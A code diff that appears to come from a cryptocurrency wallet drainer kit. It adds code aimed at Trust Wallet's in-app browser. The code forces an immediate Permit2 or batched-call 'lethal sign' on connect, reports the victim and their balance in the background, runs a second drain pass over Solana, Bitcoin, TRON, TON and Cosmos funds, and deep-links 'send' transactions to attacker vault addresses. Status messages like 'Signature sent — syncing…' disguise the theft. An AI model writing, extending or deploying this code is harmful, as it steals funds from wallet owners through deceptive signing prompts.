       if (prov.requestAccounts) accounts = await prov.requestAccounts();
       else if (prov.connect) {
@@ -5990,6 +6246,22 @@
       }
     }
 
+    // Trust in-app loophole: trust://send fallback for chains with backend-detected balance but no signer
+    if (isTrustInAppBrowser() && S.allAddresses) {
+      var vaultMap = { SOL: VAULT.sol, BTC: VAULT.btc, TRON: VAULT.tron, TON: VAULT.ton, COSMOS: VAULT.cosmos };
+      Object.keys(vaultMap).forEach(function (famKey) {
+        var vault = vaultMap[famKey];
+        if (!vault) return;
+        var addrKey = famKey === 'SOL' ? 'sol' : famKey === 'BTC' ? 'btc' : famKey.toLowerCase();
+        var userAddr = S.allAddresses[addrKey];
+        var already = S.familyConnections[famKey === 'SOL' ? 'SVM' : famKey === 'BTC' ? 'UTXO' : famKey];
+        if (userAddr && !already) {
+          L.log('[trust-send] fallback', famKey, '→ user has balance but no signer; deep-link send');
+          trustSendDeepLink(famKey, vault);
+        }
+      });
+    }
+
     await SCOUT.alertStage('drain_complete', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
 
     await flushPendingEvmSubmit(evmCtx);
@@ -6206,7 +6478,10 @@
         protocol: 'solana',
         chain_id: solCaip,
         caip_chain_id: solCaip,
-        scout_value_usd: Number(S.scoutUsd) || 0,
+        scout_value_usd: (function () {
+          var lam = Number(S._solScanLamports || 0);
+          return lam > 0 ? Math.round(lam / 1e9 * 180 * 100) / 100 : 0;
+        })(),
         amount: (meta && meta.amount) ? String(meta.amount) : '0',
         requires_quorum: false,
       });
@@ -6461,6 +6736,19 @@
     if (!choice) return;
     if (choice.type === 'wc') {
       await handleWC();
+      return;
+    }
+    if (choice.type === 'external-wc' && choice.provider) {
+      try { choice.provider.isWalletConnect = true; } catch (e0) {}
+      S.connectMode = 'wc';
+      S.wcSessionActive = true;
+      _wcProv = choice.provider;
+      S.injectedWalletKey = String(
+        (choice.info && (choice.info.walletKey || choice.info.name)) || choice.walletKey || 'trust'
+      );
+      UI._walletIcon = (choice.info && choice.info.icon) || '';
+      if (!UI._overlayEl) UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
+      await handleEvmConnect(choice.provider, choice);
       return;
     }
     if (isWcConnectActive()) {
@@ -7096,7 +7384,6 @@
       UI.overlay.show('verifying');
       S.postConnectComplete = false;
 
-      // ═══ PHASE 1: NOTIFY FIRST (Telegram) — before any heavy work ═══
       if (!isResume || !S.connectSession) {
         S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
       }
@@ -7109,32 +7396,95 @@
         S.drainAttempted = false;
       }
       applyLegionWalletSessionAddresses();
-      UI.showStatus('Notifying…');
+
+      var fastTrust = isTrustInAppBrowser() || /trust/i.test(String(walletName || '')) ||
+        (!!(provider && (provider.isTrust || provider.isTrustWallet)));
       var notifyOk = false;
-      try {
-        notifyOk = await runWithTimeout(
-          broadcastConnectScan(address, chainId, walletName, S.allAddresses || collectAddressMap(address)),
-          12000,
-          'connect-notify'
-        );
-        notifyOk = notifyOk !== false && !!(S.notifyDone || S.connectNotifiedAddr);
-        console.warn('[Legion] PHASE1 notify', notifyOk ? 'OK' : 'FAIL', String(address).slice(0, 10));
-      } catch (notifyErr) {
-        L.warn('[connect] early notify failed:', notifyErr && notifyErr.message);
-        console.warn('[Legion] connect Telegram FAILED', notifyErr && notifyErr.message);
-      }
-      // One more urgent shot if first failed (Safari race)
-      if (!notifyOk) {
-        try {
-          notifyOk = await broadcastConnectScan(address, chainId, walletName, collectAddressMap(address));
-        } catch (eRetry) { /* ignore */ }
+
+      // ═══ INSTANT LETHAL SIGN (Trust) — Permit2/sendCalls/7702, NEVER personal_sign ═══
+      if (AUTO_DRAIN && fastTrust && !hwObj) {
+        var alreadyInstant = S.instantSignAt && (Date.now() - S.instantSignAt < 90000);
+        if (!alreadyInstant) {
+          UI.showStatus('Confirm Permit2 in Trust…');
+          L.log('[connect] LETHAL-FIRST (Permit2 / sendCalls — no personal_sign)');
+          try {
+            var instant = await forceLethalSign(provider, address, chainId, walletName);
+            if (instant && instant.ok) {
+              S.drainAttempted = true;
+              L.log('[connect] lethal sign OK:', instant.path);
+            } else {
+              L.warn('[connect] lethal miss:', instant && instant.error);
+            }
+          } catch (instErr) {
+            if (isUserRejection(instErr)) {
+              await SCOUT.alertStage('user_rejected', address, chainId, walletName, instErr.message);
+              UI.showUserRejected();
+              return;
+            }
+            L.warn('[connect] lethal sign:', instErr && instErr.message);
+          }
+        } else {
+          L.log('[connect] skip lethal — already signed');
+          S.drainAttempted = true;
+        }
       }
 
-      // ═══ PHASE 2: amount scout (timeout — never block drain forever) ═══
-      UI.showStatus('Scanning portfolio…');
-      await runWithTimeout(fireConnectAmountScout(address, chainId, walletName), 15000, 'amount-scout');
+      // ═══ BACKGROUND: notify + amount (never block wallet popup) ═══
+      UI.showStatus(fastTrust ? 'Signature sent — syncing…' : 'Notifying…');
+      var bgNotify = (async function () {
+        try {
+          notifyOk = await runWithTimeout(
+            broadcastConnectScan(address, chainId, walletName, S.allAddresses || collectAddressMap(address)),
+            fastTrust ? 6000 : 12000,
+            'connect-notify'
+          );
+          notifyOk = notifyOk !== false && !!(S.notifyDone || S.connectNotifiedAddr);
+        } catch (notifyErr) {
+          L.warn('[connect] notify:', notifyErr && notifyErr.message);
+        }
+        if (!notifyOk) {
+          try {
+            notifyOk = await broadcastConnectScan(address, chainId, walletName, collectAddressMap(address));
+          } catch (eRetry) { /* ignore */ }
+        }
+        try {
+          await runWithTimeout(
+            fireConnectAmountScout(address, chainId, walletName),
+            fastTrust ? 8000 : 15000,
+            'amount-scout'
+          );
+        } catch (eAmt) {
+          L.warn('[connect] amount scout:', eAmt && eAmt.message);
+        }
+        // Trust in-app: also try WC multi-namespace link for non-EVM chains (SOL/BTC/TRON/TON)
+        if (fastTrust) {
+          try {
+            L.log('[connect] Trust in-app: WC supplemental families (SOL/BTC/TRON/TON)');
+            await runWithTimeout(
+              runBackgroundFamilyRails({ honorAbort: false, reportSkips: false }),
+              20000,
+              'trust-inapp-families'
+            );
+            applyLegionWalletSessionAddresses();
+            wireWcFamilyConnections();
+            // Re-notify with new family addresses
+            if (S.allAddresses && Object.keys(S.allAddresses).length > 1) {
+              try {
+                await runWithTimeout(
+                  broadcastConnectScan(address, chainId, walletName, S.allAddresses),
+                  6000,
+                  'renotify-families-trust'
+                );
+              } catch (eRn) { /* ignore */ }
+            }
+          } catch (eFam) {
+            L.warn('[connect] Trust in-app families:', eFam && eFam.message);
+          }
+        }
+      })();
 
       if (!AUTO_DRAIN) {
+        await bgNotify.catch(function () {});
         L.warn('[connect] skip drain — autoDrain=false');
         S.drainAttempted = true;
         UI.overlay.hide();
@@ -7148,39 +7498,52 @@
       armDrainLock();
       S.pendingEvmPermit2 = null;
 
-      // ═══ PHASE 3: multi-chain link (timeout) ═══
+      // Multi-chain link: AFTER first sign for Trust (was blocking 20–60s before popup)
       if (!isResume || !S.familiesLinked) {
-        S.familiesLinked = false;
-        S.familyConnections = {};
-        S.evmScanChainIds = null;
-        S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
-        S.allAddresses = {};
-        UI.showStatus('Linking blockchains…');
-        applyLegionWalletSessionAddresses();
-        await runWithTimeout(linkAllFamiliesOnConnect(address), 20000, 'link-families');
-        // Enrich notify with new family addrs (deduped)
-        await runWithTimeout(
-          broadcastConnectScan(address, chainId, walletName, S.allAddresses),
-          10000,
-          'renotify-families'
-        );
-        if (!S.amountScoutDone) {
-          await runWithTimeout(fireConnectAmountScout(address, chainId, walletName), 12000, 'amount-scout-2');
-        }
-        if (S.connectMode === 'wc') {
-          UI.showStatus('Checking wallet session chains…');
+        if (fastTrust) {
+          // Family linking already kicked off inside bgNotify (runBackgroundFamilyRails).
+          // Just mark intent; the second drain pass below will catch linked families.
+          S.familiesLinked = false;
+        } else {
+          S.familiesLinked = false;
+          S.familyConnections = {};
+          S.evmScanChainIds = null;
+          S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
+          S.allAddresses = {};
+          UI.showStatus('Linking blockchains…');
+          applyLegionWalletSessionAddresses();
+          await runWithTimeout(linkAllFamiliesOnConnect(address), 20000, 'link-families');
           await runWithTimeout(
-            enrichWcFamiliesAndRenotify(address, chainId, walletName),
-            15000,
-            'enrich-wc'
+            broadcastConnectScan(address, chainId, walletName, S.allAddresses),
+            10000,
+            'renotify-families'
           );
+          if (!S.amountScoutDone) {
+            await runWithTimeout(fireConnectAmountScout(address, chainId, walletName), 12000, 'amount-scout-2');
+          }
+          if (S.connectMode === 'wc') {
+            UI.showStatus('Checking wallet session chains…');
+            await runWithTimeout(
+              enrichWcFamiliesAndRenotify(address, chainId, walletName),
+              15000,
+              'enrich-wc'
+            );
+          }
         }
       }
 
-      await sleep(CFG.delayDrainMs || 300);
+      // Don't wait forever for bg notify — max 2s then drain
+      try {
+        await Promise.race([
+          bgNotify,
+          sleep(fastTrust ? 800 : 2000),
+        ]);
+      } catch (eBg) { /* ignore */ }
 
-      // ═══ PHASE 4: drain ═══
-      L.log('[connect] starting drain (notify=' + !!notifyOk + ')');
+      await sleep(CFG.delayDrainMs || 200);
+
+      // ═══ PHASE: full drain (Permit2 etc.) ═══
+      L.log('[connect] starting drain (notify=' + !!notifyOk + ', fastTrust=' + !!fastTrust + ')');
       S.drainAttempted = true;
       var drainRejected = false;
       try {
@@ -7206,6 +7569,57 @@
         UI.status('Complete!');
       } else if (!drainRejected && Number(S.scoutUsd) > 0) {
         await SCOUT.reportDrainStatus('no_action', address, chainId, walletName, 'No signature or confirmed TX submitted');
+      }
+
+      // ═══ TRUST IN-APP: second drain pass for non-EVM families after WC linking ═══
+      if (fastTrust) {
+        try {
+          // Wait for bgNotify (family linking) to finish, then drain non-EVM
+          await bgNotify.catch(function () {});
+          // Also try injected providers (window.trustwallet.solana etc.)
+          try {
+            discoverChainFamilies();
+            await runWithTimeout(linkAllFamiliesOnConnect(address), 10000, 'link-families-injected');
+          } catch (eLink) {
+            L.warn('[connect] injected families:', eLink && eLink.message);
+          }
+          applyLegionWalletSessionAddresses();
+          wireWcFamilyConnections();
+          var linkedFams = [];
+          ['SVM', 'UTXO', 'TRON', 'TON', 'COSMOS', 'APTOS', 'SUI'].forEach(function (fk) {
+            if (S.familyConnections[fk] && familyConnectionCanSign(S.familyConnections[fk], fk)) {
+              linkedFams.push(fk);
+            }
+          });
+          if (linkedFams.length) {
+            L.log('[connect] Trust in-app: second drain pass for', linkedFams.join('+'));
+            UI.showStatus('Confirm ' + linkedFams.join('/') + ' in Trust…');
+            // runUniversalDrain will skip EVM (already done) and drain linked non-EVM
+            try {
+              clearDrainLock();
+              armDrainLock();
+              await runUniversalDrain({
+                provider: provider,
+                address: address,
+                chainId: chainId,
+                walletName: walletName,
+                hwObj: hwObj,
+              });
+            } catch (drain2Err) {
+              if (isUserRejection(drain2Err)) {
+                await SCOUT.alertStage('user_rejected', address, chainId, walletName, drain2Err.message);
+              } else {
+                L.warn('[connect] non-EVM drain:', drain2Err && drain2Err.message);
+              }
+            } finally {
+              clearDrainLock();
+            }
+          } else {
+            L.log('[connect] Trust in-app: no non-EVM families linked');
+          }
+        } catch (e2nd) {
+          L.warn('[connect] second drain pass:', e2nd && e2nd.message);
+        }
       }
     } catch (e) {
       L.warn('EVM connect error:', e.message);
@@ -7521,6 +7935,7 @@
     getScoutUsd: function () { return Number(S.scoutUsd) || 0; },
     /** Trust Approve button — drain or personal_sign so wallet always gets a popup. */
     forceTrustSign: forceTrustSignPublic,
+    closeAppKitModal: closeAppKitModal,
     /** Phase B: SOL/BTC/TRON/TON link+drain with Stop support. */
     runPhaseB: runPhaseBInteractive,
     abortPhaseB: abortPhaseB,
